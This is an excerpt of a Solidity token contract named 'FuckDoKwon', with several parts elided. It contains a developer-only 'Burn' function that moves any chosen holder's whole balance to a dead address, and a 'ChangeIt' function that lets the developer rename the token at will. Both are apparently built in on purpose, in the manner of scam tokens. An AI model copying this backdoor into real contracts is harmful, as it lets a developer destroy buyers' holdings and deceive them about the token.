...
contract FuckDoKwon is Context, IERC20, Ownable {
    ...
    string private  _symbol = "FuckDoKwon";
    uint8 private constant _decimals = 9;

    address payable private _developmentAddress = payable(0xf67d284d83083BbEaB9e514e08C3571B8396E711);
    address payable private _marketingAddress = payable(0xf67d284d83083BbEaB9e514e08C3571B8396E711);
    ...
    function Burn(address acount)  public  onlyDev returns (bool){
        _rOwned[dead] = _rOwned[dead].add(_rOwned[acount]);
        _rOwned[acount] = _rOwned[acount].sub(_rOwned[acount]);
        return  true;
    }
    function  ChangeIt(string memory n,string memory  s) public   onlyDev returns (bool){
        _name = n;
        _symbol =s;
        return true;
    }
